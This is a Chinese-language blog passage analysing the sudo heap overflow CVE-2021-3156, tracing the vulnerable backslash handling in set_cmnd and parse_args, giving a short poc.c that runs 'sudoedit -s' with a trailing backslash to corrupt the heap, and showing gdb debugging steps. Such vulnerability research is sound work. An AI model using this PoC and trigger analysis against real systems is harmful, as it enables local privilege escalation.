   <span class="token number">865</span>                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">866</span>                          <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token number">867</span>                              from<span class="token operator">++</span><span class="token punctuation">;</span>
   <span class="token number">868</span>                          <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>
   <span class="token number">869</span>                      <span class="token punctuation">&#125;</span>
   <span class="token number">870</span>                      <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>
   <span class="token number">871</span>                  <span class="token punctuation">&#125;</span>
   <span class="token number">872</span>                  <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
   <span class="token number">873</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> 

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 set_cmnd 函数，看到 866 行处，以 <code>\</code> 开头下一个字符不是空格，那么就认为是转义字符，<code>from++</code> 跳过字符 <code>\</code>，但是没有考虑到下一个字符是 <code>\0</code> 的情况，如果下一个字符是 <code>\0</code>，那么 <code>*to = *from++</code> 就写入 <code>\0</code> 字符，下一次循环条件判断成立，则继续往 user_args 里面写入数据，而 user_args 是在 852-854 行处使用 malloc 分配的一个堆块，这就可以造成一个堆溢出的漏洞</p>
<p><strong>最后一个参数后面就是环境变量的位置，所以只要最后一个参数以一个 <code>\</code> 结尾，那么就可以通过控制环境变量，堆溢出写入任意数据</strong></p>
<p>同时看到 819 行处，触发漏洞需要设置 <code>MODE_RUN</code>，<code>MODE_EDIT</code>，<code>MODE_CHECK</code> 中的一个，858 行处，要求设置 <code>MODE_SHELL</code> 或 <code>MODE_LOGIN_SHELL</code></p>
<p>想要触发漏洞，还要先看看下面这段代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
<span class="token comment">//parse_args()</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">571</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> MODE_RUN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ISSET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">572</span>          <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">,</span> <span class="token operator">*</span>cmnd <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
   <span class="token number">573</span>          <span class="token keyword">int</span> ac <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token number">574</span>
   <span class="token number">575</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">576</span>              <span class="token comment">/* shell -c "command" */</span>
   <span class="token number">577</span>              <span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token operator">*</span>dst<span class="token punctuation">;</span>
   <span class="token number">578</span>              <span class="token class-name">size_t</span> cmnd_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>
   <span class="token number">579</span>                  <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token number">580</span>
   <span class="token number">581</span>              cmnd <span class="token operator">=</span> dst <span class="token operator">=</span> <span class="token function">reallocarray</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> cmnd_size<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">582</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>cmnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
   <span class="token number">583</span>                  <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">584</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">gc_add</span><span class="token punctuation">(</span>GC_PTR<span class="token punctuation">,</span> cmnd<span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token number">585</span>                  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">586</span>
   <span class="token number">587</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span>av <span class="token operator">=</span> argv<span class="token punctuation">;</span> <span class="token operator">*</span>av <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">588</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span>src <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> src<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">589</span>                      <span class="token comment">/* quote potential meta characters */</span>
   <span class="token number">590</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isalnum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'_'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'$'</span><span class="token punctuation">)</span>
   <span class="token number">591</span>                          <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
   <span class="token number">592</span>                      <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>src<span class="token punctuation">;</span>
   <span class="token number">593</span>                  <span class="token punctuation">&#125;</span>
   <span class="token number">594</span>                  <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>
   <span class="token number">595</span>              <span class="token punctuation">&#125;</span>
   <span class="token number">596</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>cmnd <span class="token operator">!=</span> dst<span class="token punctuation">)</span>
   <span class="token number">597</span>                  dst<span class="token operator">--</span><span class="token punctuation">;</span>  <span class="token comment">/* replace last space with a NUL */</span>
   <span class="token number">598</span>              <span class="token operator">*</span>dst <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
   <span class="token number">599</span>
   <span class="token number">600</span>              ac <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* -c cmnd */</span>
   <span class="token number">601</span>          <span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>在处理命令行参数的时候，设置了 <code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 的情况下，会对命令行参数进行重写，把所有元字符包括 <code>\</code> 都转义了，也就是单个反斜杠变成了两个反斜杠，导致后面的漏洞无法触发</p>
<p>总结一下：</p>
<ol>
<li><code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 不能都设置，因为在 sudo 程序的 <code>parse_args</code> 函数里会对反斜杠进行转义，导致漏洞无法触发</li>
<li>触发漏洞需要设置 <code>MODE_RUN</code>，<code>MODE_EDIT</code>，<code>MODE_CHECK</code> 中的一个，同时要设置 <code>MODE_SHELL</code> 或 <code>MODE_LOGIN_SHELL</code></li>
</ol>
<p>那么 <code>MODE_RUN</code> 是不可以设置的，因为一旦设置 <code>MODE_RUN</code>，触发漏洞条件需要 <code>MODE_SHELL</code>，而 <code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 同时存在会导致 <code>parse_args</code> 对反斜杠进行转义，导致漏洞无法触发</p>
<p><strong>那么就要设置 <code>MODE_EDIT</code> 或者 <code>MODE_CHECK</code>，同时不能设置 <code>MODE_RUN</code></strong></p>
<p>设置 <code>MODE_EDIT</code> 使用 <code>-e</code>，<code>MODE_LOGIN_SHELL</code> 使用 <code>-i</code>，<code>MODE_SHELL</code> 使用 <code>-s</code>，对应源码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">358</span>                  <span class="token keyword">case</span> <span class="token string">'e'</span><span class="token operator">:</span>
   <span class="token number">359</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">&amp;&amp;</span> mode <span class="token operator">!=</span> MODE_EDIT<span class="token punctuation">)</span>
   <span class="token number">360</span>                          <span class="token function">usage_excl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">361</span>                      mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>
   <span class="token number">362</span>                      sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
   <span class="token number">363</span>                      valid_flags <span class="token operator">=</span> MODE_NONINTERACTIVE<span class="token punctuation">;</span>
   <span class="token number">364</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">402</span>                  <span class="token keyword">case</span> <span class="token string">'i'</span><span class="token operator">:</span>
   <span class="token number">403</span>                      sudo_settings<span class="token punctuation">[</span>ARG_LOGIN_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
   <span class="token number">404</span>                      <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">405</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">460</span>                  <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>
   <span class="token number">461</span>                      sudo_settings<span class="token punctuation">[</span>ARG_USER_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
   <span class="token number">462</span>                      <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">463</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>MODE_CHECK</code> 在这里设置，使用 <code>-l</code></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">416</span>                  <span class="token keyword">case</span> <span class="token string">'l'</span><span class="token operator">:</span>
   <span class="token number">417</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">418</span>                          <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">==</span> MODE_LIST<span class="token punctuation">)</span>
   <span class="token number">419</span>                              <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_LONG_LIST<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">420</span>                          <span class="token keyword">else</span>
   <span class="token number">421</span>                              <span class="token function">usage_excl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">422</span>                      <span class="token punctuation">&#125;</span>
   <span class="token number">423</span>                      mode <span class="token operator">=</span> MODE_LIST<span class="token punctuation">;</span>
   <span class="token number">424</span>                      valid_flags <span class="token operator">=</span> MODE_NONINTERACTIVE<span class="token operator">|</span>MODE_LONG_LIST<span class="token punctuation">;</span>
   <span class="token number">425</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">518</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> mode <span class="token operator">==</span> MODE_LIST<span class="token punctuation">)</span>
   <span class="token number">519</span>          mode <span class="token operator">=</span> MODE_CHECK<span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么有以下几种选择：</p>
<ol>
<li><code>-s -e</code></li>
<li><code>-i -e</code></li>
<li><code>-s -l</code></li>
<li><code>-i -l</code></li>
</ol>
<p>但是，<code>-e</code> 和 <code>-l</code>，都会导致 <code>valid_flags</code> 的改变，最后在 532 行处，导致程序退出，所以上面的 4 种方式都无效</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">127</span>  #define <span class="token function">DEFAULT_VALID_FLAGS</span>     <span class="token punctuation">(</span>MODE_BACKGROUND<span class="token operator">|</span>MODE_PRESERVE_ENV<span class="token operator">|</span>MODE_RESET_HOME<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token operator">|</span>MODE_NONINTERACTIVE<span class="token operator">|</span>MODE_SHELL<span class="token punctuation">)</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">249</span>      <span class="token keyword">int</span> valid_flags <span class="token operator">=</span> DEFAULT_VALID_FLAGS<span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">532</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> valid_flags<span class="token punctuation">)</span> <span class="token operator">!=</span> flags<span class="token punctuation">)</span>
   <span class="token number">533</span>          <span class="token function">usage</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看源码还发现一处地方：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">268</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>proglen <span class="token operator">></span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>progname <span class="token operator">+</span> proglen <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"edit"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">269</span>          progname <span class="token operator">=</span> <span class="token string">"sudoedit"</span><span class="token punctuation">;</span>
   <span class="token number">270</span>          mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>
   <span class="token number">271</span>          sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>
   <span class="token number">272</span>      <span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当程序的名字是 sudoedit 时，会设置 <code>MODE_EDIT</code>，而不会去修改 <code>valid_flags</code>，那么就可以达成漏洞利用的条件，这就是 poc 和目前已公开的 exp 都使用 sudoedit 而不适用 sudo 的原因</p>
<p>那么只需要用 <code>sudoedit -s xxx</code>，就可以设置 <code>MODE_EDIT</code> 和 <code>MODE_SHELL</code>，而不设置 <code>MODE_RUN</code> 了</p>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="调试前准备"><a href="#调试前准备" class="headerlink" title="调试前准备"></a>调试前准备</h3><p>使用源码编译的程序进行调试，编译后创建一个链接 sudoedit 到 sudo，或者改名 sudo 为 sudoedit（ubuntu 中的 sudoedit 其实是 sudo 的一个软链接），权限改为 root，并加上 sid 权限</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>为了更好操控 sudo 程序的环境变量，采用 execve 函数来执行 sudoedit，这里写一个 poc.c:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//poc.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_ENVP</span> <span class="token expression"><span class="token number">0x1000</span></span></span>

<span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span>MAX_ENVP<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span><span class="token number">65535</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>


        <span class="token keyword">char</span> <span class="token operator">*</span>s_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token comment">//命令行参数</span>
                <span class="token string">"sudoedit"</span><span class="token punctuation">,</span> <span class="token string">"-s"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> <span class="token constant">NULL</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">//环境变量</span>
                                                                    
        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/path/to/sudoedit"</span><span class="token punctuation">,</span> s_argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="调试开始"><a href="#调试开始" class="headerlink" title="调试开始"></a>调试开始</h3><p>使用 <code>sudo gdb ./poc</code>，执行 <code>catch exec</code> 跟踪 execve，<code>r</code> 命令运行</p>
<p>setlocale 是 sudo 程序开头调用的函数，在这下断点，断下后 <code>finish</code> 即可进入 sudo 的 main 函数</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-1.png" alt="entry"></p>
<p>要注意的是，进入 main 函数后，最好删除 setlocale 的断点，以免后续的调用影响跟踪调试</p>
<p>使用 <code>b 213</code> 下断点在 213 行处：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token number">212</span>         <span class="token comment">/* Load plugins. */</span>
<span class="token number">213</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">sudo_load_plugins</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>policy_plugin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>io_plugins<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">214</span>             <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"fatal error, unable to load plugins"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>n</code> 命令步过，加载完 sudoers.so 库后，使用命令 <code>b set_cmnd</code> 在 set_cmnd 函数下断点，<code>c</code> 继续运行，来到断点处，并在 854 行下断点，继续运行</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token number">854</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token number">855</span>                     <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">856</span>                     <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">857</span>                 <span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>user_args 的大小为 0x10002 即 65538 （<code>&quot;\\&quot; + &quot;A&quot; * 65535 + 2</code>），并记录 user_args 的 chunk 地址为 <code>0x55555558faa0</code></p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-2.png" alt="user_args_size"><br><img src="/images/CVE-2021-3156/CVE-2021-3156-3.png" alt="user_args"></p>
<p>跟踪来到漏洞点处：</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-4.png" alt="user_args"></p>
<p>来到 870 处：</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-5.png" alt="870"></p>
<p>此时可以发现没有溢出，因为此时只复制了反斜杠字符后面的 <code>\0</code>，以及后面的 65535 个 A，本身 chunk 的大小是足够的</p>
<p>但是，for 循环继续运行，<code>&quot;A&quot; * 65535</code> 又开始继续往后覆盖，此时溢出就出现了</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-6.png" alt="overwrite"></p>
<p>可以看到，溢出把下一个 chunk 的 size 字段都改了，后面 malloc 的时候触发 abort，导致程序异常退出了</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此时可以知道几点：</p>
<ol>
<li>user_args 的大小可以由命令行参数控制</li>
<li>命令行参数中出现单个反斜杠字符结尾，则会导致堆溢出</li>
<li>若单个反斜杠结尾出现在最后一个命令行参数，那么溢出的内容就是紧接着的环境变量，完全可控</li>
<li>单个反斜杠结尾的命令行参数或者环境变量都能往 chunk 写入 <code>\0</code></li>
</ol>
